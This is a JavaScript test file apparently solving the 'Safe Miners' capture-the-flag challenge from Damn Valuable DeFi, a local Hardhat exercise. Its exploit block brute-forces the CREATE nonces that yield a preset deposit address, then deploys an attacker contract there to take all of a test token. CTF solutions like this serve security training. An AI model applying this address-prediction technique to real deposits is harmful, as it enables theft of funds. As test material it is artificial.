const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Safe Miners', function () {
    let deployer, attacker;

    const DEPOSIT_TOKEN_AMOUNT = ethers.utils.parseEther('2000042');
    const DEPOSIT_ADDRESS = '0x79658d35aB5c38B6b988C23D02e0410A380B8D5c';

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deposit the DVT tokens to the address
        await this.token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are correctly set
        expect(await this.token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await this.token.balanceOf(attacker.address)).eq('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // off chain search the target address by `create-create`
        let found = false;
        for (let nonce = 0; nonce < 100; nonce++) {
            let tx = { from: attacker.address, nonce: ethers.BigNumber.from(nonce) };
            const contractAddr = ethers.utils.getContractAddress(tx);

            for (let nonce2 = 1; nonce2 < 100; nonce2++) {
                tx = { from: contractAddr, nonce: ethers.BigNumber.from(nonce2) };
                if(ethers.utils.getContractAddress(tx)==DEPOSIT_ADDRESS){
                    // console.log('target found! nonce1:%d, nonce2:%d', nonce, nonce2);
                    found = true;
                    break;
                }
            }
            if(found) break;
        }
        // nonce1:1, nonce2:66
        // increase nonce by send value
        await attacker.sendTransaction({value: ethers.BigNumber.from(1), to: ethers.constants.AddressZero});

        const someContract = await (
            await ethers.getContractFactory('SafeMinerAttacker', attacker)
            ).deploy(this.token.address, 66);
        await someContract.deployed();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        // The attacker took all tokens available in the deposit address
        expect(
            await this.token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(DEPOSIT_TOKEN_AMOUNT);
    });
});
